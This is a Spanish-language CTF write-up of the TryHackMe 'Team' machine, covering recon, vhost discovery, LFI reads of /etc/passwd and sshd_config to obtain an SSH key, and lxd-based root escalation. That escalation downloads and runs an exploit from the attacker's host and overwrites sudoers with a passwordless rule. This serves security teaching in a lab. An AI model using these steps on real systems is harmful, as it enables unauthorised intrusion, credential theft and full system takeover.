---
layout: single
title: Team - TryHackMe
excerpt: " A beginner friendly box that teaches the importance of doing your enumeration well. It starts of by finding a virtual host(vhost) that leads you to a dead end(a bootstrap themed webpage). "
date: 2023-01-29
classes: wide
header:
  teaser: /blog/assets/images/thm-writeup-team/team.png
  teaser_home_page: true
  icon: /blog/assets/images/tryhackme.webp
categories:
  - tryhackme
tags:
  - subdomain
  - source
  - lfi
  - lxd
  - docker
---

A beginner friendly box that teaches the importance of doing your enumeration well. It starts of by finding a virtual host(vhost) that leads you to a dead end(a bootstrap themed webpage).

# Summary
- IP: 10.10.14.180
- Ports: 21,22,80
- OS: Linux (Ubuntu Bionic)
- Services & Applications:
	-  21 -> vsftpd 3.0.3
	-  22 -> OpenSSH 7.6p1 Ubuntu
	-  80 -> Apache httpd 2.4.29
# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.14.180 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p21,22,80 -sCV 10.10.14.180 -oN targeted
```

- Análisis de directorios con gobuster:

```bash
$gobuster dir -u 10.10.14.180 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
```

# Análisis de página web:

- Analizamos la página web, vemos la página principal de apache, revisamos el código fuente y vemos la siguiente linea:

```html
<title>Apache2 Ubuntu Default Page: It works! If you see this add 'team.thm' to your hosts!</title>
```

- Lo cual nos sugiere la existencia de Virtual Hosting, agregamos la dirección "team.thm" al archivo "/etc/hosts" y entramos al mismo para buscar posibles vectores de ataque.

- Buscamos directorios posibles con gobuster y encontramos uno interesante "/scripts" al cual no tenemos acceso, buscamos en ese directorio:

```bash
$gobuster dir -u http://team.thm/ -w /home/dante/SecLists/Discovery/Web-Content/common.txt -t 100

$gobuster dir -u http://team.thm/scripts -w /home/dante/SecLists/Discovery/Web-Content/common.txt -t 100 -x txt,js
```

- Encontramos un archivo "script.txt" lo leemos:

```
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <<END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

#Updated version of the script
#Note to self had to change the extension of the old "script" in this folder, as it has creds in
```

- En la linea final podemos ver que nos dice la existencia de un archivo "script.old" el cual debería tener credenciales, lo abrimos y encontramos las credenciales del usuario "ftpuser", accedemos por FTP.

- ftp 10.10.14.180

- Enumeramos los recursos, vemos un directorio "workshare" el cual contiene un archivo "New_site.txt" lo descargamos y lo leemos:

```
Dale
I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.
Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.
Gyles 
```

- Enumeramos posibles usuarios "Dale, Gyles", también nos dice de la existencia de un subdominio "dev" y que hay un backup de la clave privada SSH del usuario  "Dale" en "archivo de configuración", entramos a "dev.team.thm" previamente agregándolo al "/etc/hosts" y vemos una página no terminada con un link el cual nos redirige a un recurso php, el link se ve así:

```
http://dev.team.thm/script.php?page=teamshare.php
```

- Nos damos cuenta que el archivo "script.php" está apuntando al archivo "teamshare.php" mediante el parámetro "page", intentamos apuntar a otro archivo del sistema para comprobar si existe un LFI:

```
http://dev.team.thm/script.php?page=../../../etc/passwd
```

- Y efectivamente nos muestra lo que contiene el archivo "/etc/passwd", así que hacemos una enumeración de recursos que nos permitan ganar acceso a la máquina; anteriormente habíamos leido que existe un backup de una clave privada SSH en un "archivo de configuración", así que enumeramos en los posibles archivos de configuración de SSH:

```
http://dev.team.thm/script.php?page=../../../etc/ssh/sshd_config
```

- Encontramos una id_rsa, la guardamos en nuestro equipo, le damos permiso de ejecución y la usamos para entrar por SSH como el usuario "dale":

```bash
$nano id_rsa
$chmod 600 id_rsa
$ssh -i id_rsa dale@10.10.14.180
```

- Hemos ganado acceso al sistema como "dale" y podremos ver la primera flag.


# ESCALANDO PRIVILEGIOS:

- Vemos los grupos a los que pertenece el usuario "dale":

```
$id
```

- Identificamos el grupo "lxd" el cual tiene una vulnerabilidad que podemos encontrar con:

```
$searchsploit lxd
```

- Para explotar dicha vulnerabilidad seguimos los pasos descritos en la script:

```
# Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]
# Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]
# Step 3: Run this script and you will get root [Victim Machine]
# Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine
```

- Descargamos "build-alpine"

- La desplegamos con el comando de la segunda linea y se nos generará un archivo .tar.gz

- Nos abrimos un servidor http con python para transferir la script y el archivo .tar.gz a la máquina victima:

```bash
$python3 -m http.server 80
```

```bash
$wget 10.18.101.123:80/exploit.sh
$wget 10.18.101.123:80/alpine-v3.17-x86_64-20230128_1210.tar.gz
$chmod +x exploit.sh
```

- Ejecutamos la script:

```bash
$./exploit.sh -f alpine-v3.17-x86_64-20230128_1210.tar.gz
```

- Nos dirigimos al directorio "/mnt/root" y tendremos acceso total a todos los archivos del sistema de la máquina víctima, pero aún estamos en un contenedor por medio de una montura, para tener acceso a la máquina real, modificamos el archivo "/etc/sudoers" para que podamos ejecutar cualquier comando como root:

```
$rm /etc/sudoers

$vi /etc/sudoers
```

```
ALL ALL=(ALL) NOPASSWD: ALL
```

- Guardamos el archivo, y salimos de la montura con "exit".

- Ahora en la máquina real podremos ejecutar cualquier cosa como root, así que hacemos un "sudo su" y seremos root.
